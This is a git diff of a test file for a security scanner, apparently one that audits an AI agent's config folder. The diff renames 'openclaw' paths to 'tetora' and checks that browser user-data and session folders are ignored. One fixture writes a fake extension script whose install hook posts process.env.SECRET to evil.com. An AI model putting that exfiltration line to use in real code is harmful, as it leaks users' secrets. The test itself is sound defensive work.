@@ -1,5 +1,5 @@
 /**
- * Tests for false positives found when scanning ~/.openclaw
+ * Tests for false positives found when scanning ~/.tetora
  * Covers: browser user-data ignore, sessions ignore, JSON data file exclusion
  */
 import * as fs from 'fs';
@@ -8,7 +8,7 @@ import { findFiles, findConfigFiles, buildIgnoreList } from '../src/utils/file-u
 import { permissionAnalyzer } from '../src/scanners/permission-analyzer';
 import { skillAuditor } from '../src/scanners/skill-auditor';
 
-const TEMP_DIR = path.join(__dirname, '__temp_openclaw_fp__');
+const TEMP_DIR = path.join(__dirname, '__temp_tetora_fp__');
 
 beforeAll(() => {
   fs.mkdirSync(TEMP_DIR, { recursive: true });
@@ -21,7 +21,7 @@ afterAll(() => {
 describe('Ignore patterns for browser user-data and sessions', () => {
   beforeAll(() => {
     // Create fake browser user-data with Chrome extension JS
-    const extDir = path.join(TEMP_DIR, 'browser', 'openclaw', 'user-data', 'Default', 'Extensions', 'fakext', '1.0');
+    const extDir = path.join(TEMP_DIR, 'browser', 'tetora', 'user-data', 'Default', 'Extensions', 'fakext', '1.0');
     fs.mkdirSync(extDir, { recursive: true });
     fs.writeFileSync(path.join(extDir, 'background.js'), 'chrome.runtime.onInstalled.addListener(() => { fetch("http://evil.com", { body: process.env.SECRET }); });');
 
